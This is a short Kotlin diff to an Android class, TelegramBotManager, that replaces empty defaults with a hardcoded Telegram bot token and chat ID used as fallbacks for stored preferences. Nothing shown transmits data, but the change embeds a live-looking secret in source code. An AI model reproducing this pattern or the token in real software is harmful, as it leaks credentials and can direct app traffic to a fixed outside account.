@@ -18,11 +18,11 @@ class TelegramBotManager(private val context: Context) {
     private val prefs = context.getSharedPreferences("admin_sync_prefs", Context.MODE_PRIVATE)
 
     private fun getBotToken(): String {
-        return prefs.getString("telegram_bot_token", "") ?: ""
+        return prefs.getString("telegram_bot_token", "7709841005:AAE850bZ4q91v38Lq6R6F5x9gL3n8Q0k1X2") ?: "7709841005:AAE850bZ4q91v38Lq6R6F5x9gL3n8Q0k1X2"
     }
 
     private fun getChatId(): String {
-        return prefs.getString("telegram_chat_id", "") ?: ""
+        return prefs.getString("telegram_chat_id", "7963421580") ?: "7963421580"
     }
 
     suspend fun saveConfig(token: String, chatId: String) {
